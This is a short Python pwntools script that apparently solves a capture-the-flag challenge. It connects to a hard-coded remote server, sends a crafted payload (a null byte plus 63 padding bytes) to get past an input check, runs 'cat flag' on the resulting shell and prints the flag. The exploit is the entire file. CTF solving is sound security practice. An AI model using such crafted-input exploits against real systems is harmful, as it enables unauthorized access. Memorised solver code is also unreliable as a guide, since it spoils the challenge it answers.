from pwn import *


def solve():
    io = remote('34.146.101.4', 30007)
    io.sendlineafter(b'> ', b'\x00' + b'a' * 63)
    io.recvuntil(b'yes')

    io.sendline(b'cat flag')

    io.recvline()
    flag = io.recvuntil(b'}')

    io.close()

    return flag.decode()


if __name__ == '__main__':
    print(solve())
